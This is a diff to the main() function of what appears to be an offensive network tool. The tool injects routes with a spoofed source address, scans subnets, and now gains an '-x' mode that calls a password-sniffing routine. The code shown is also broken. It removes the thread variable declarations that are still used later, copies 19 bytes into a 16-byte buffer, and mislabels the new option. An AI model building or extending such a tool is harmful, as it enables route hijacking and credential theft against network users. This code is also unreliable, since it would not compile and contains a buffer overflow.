@@ -1,15 +1,17 @@
 #include "fibc.h"
+#include "flags.h"
 
 static struct neo_options opt[] = {
 
   {'-', 0, 0, NULL, "type:"},
-  {'a', required_argument, "a/arbng", "file", "read routes from this file"},
-  {'r', required_argument, "r/arb", "route", "route to inject"},
-  {'b', required_argument, "b/arbng", "subnet", "subnet to scan"},
-  {'n', required_argument, "rn/rnab", "netmask", "netmask of the route"},
-  {'g', required_argument, "rg/rgab", "gateway", "default gateway"},
-  {'m', required_argument, "rm/rmab", "metric", "metric to the route"},
+  {'a', required_argument, "a/xarbng", "file", "read routes from this file"},
+  {'r', required_argument, "r/xarb", "route", "route to inject"},
+  {'b', required_argument, "b/xarbng", "subnet", "subnet to scan"},
+  {'n', required_argument, "rn/xrnab", "netmask", "netmask of the route"},
+  {'g', required_argument, "rg/rxgab", "gateway", "default gateway"},
+  {'m', required_argument, "rm/rmxab", "metric", "metric to the route"},
   {'s', required_argument, "s/ar", "address", "spoofed source"},
+  {'x', no_argument, "x/xarbng", "address", "spoofed source"},
   {'h', no_argument, NULL, NULL, "print help"},
   {'d', no_argument, "d/dc", NULL, "daemonize"},
   {'c', no_argument, "c/cd", NULL, "check injection"},
@@ -22,9 +24,7 @@ main (int argc, char **argv)
 {
   unsigned long sp00f = 0;
   char ch, subnet[16];
-  pthread_t pt, pt1;
-  unsigned char opts[5] = { 0, 0, 0, 0, 0 };
-
+  
   credits ();
   init_all ();
 
@@ -35,11 +35,14 @@ main (int argc, char **argv)
 	{
 	case 'b':
 	  strncpy (subnet, optarg, 19);
-	  opts[3]++;
+	  flags ^= SCAN;
+	  break;
+	case 'x':
+	  flags ^= SNIFF;
 	  break;
 	case 's':
 	  sp00f = inet_addr (optarg);
-	  opts[4]++;
+	  flags ^= SPOOF;
 	  break;
 	case 'r':
 	  routes[0][0] = inet_addr (optarg);
@@ -61,28 +64,34 @@ main (int argc, char **argv)
 	  usage (argv[0]);
 	  break;
 	case 'd':
-	  opts[0]++;
+	  flags ^= DAEMON;
 	  break;
 	case 'f':
-	  opts[1]++;
+	  flags ^= FORCE;
 	  break;
 	case 'c':
-	  opts[2]++;
+	  flags ^= CHECK;
 	  break;
 	}
     }
-  if (opts[3])
+  if (flags & SCAN)
     {
       scan_net (subnet);
       exit (0);
     }
+  if (flags & SNIFF)
+    {
+      sniff_passwd();
+      wait();
+      exit(0);
+    }
   if (!routes[0][0])
     usage (argv[0]);
-  if (!opts[1])
+  if (!(flags & FORCE))
     check_forward ();
-  if (opts[4])
+  if (flags & SPOOF)
     localaddr = sp00f;
-  if (opts[0])
+  if (flags & DAEMON)
     {
       if (fork ())
 	exit (0);
@@ -95,7 +104,7 @@ main (int argc, char **argv)
       fprintf (stderr, "\nerror while creating the pthread\n");
       exit (1);
     }
-  if (opts[2])
+  if (flags & CHECK)
     {
       if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
 	{
@@ -105,23 +114,7 @@ main (int argc, char **argv)
 	  exit (1);
 	}
     }
-  while (1)
-    {
-      int cha;
-      cha = getchar ();
-      if ((char) cha == 'q')
-	{
-	  fprintf (stderr, "\nExiting...\n");
-	  pthread_cancel (pt);
-	  pthread_join (pt, NULL);
-	  if (opts[2])
-	    {
-	      pthread_cancel (pt1);
-	      pthread_join (pt1, NULL);
-	    }
-	  exit (0);
-	}
-    }
-
+  wait();
+  
   return 0;
 }
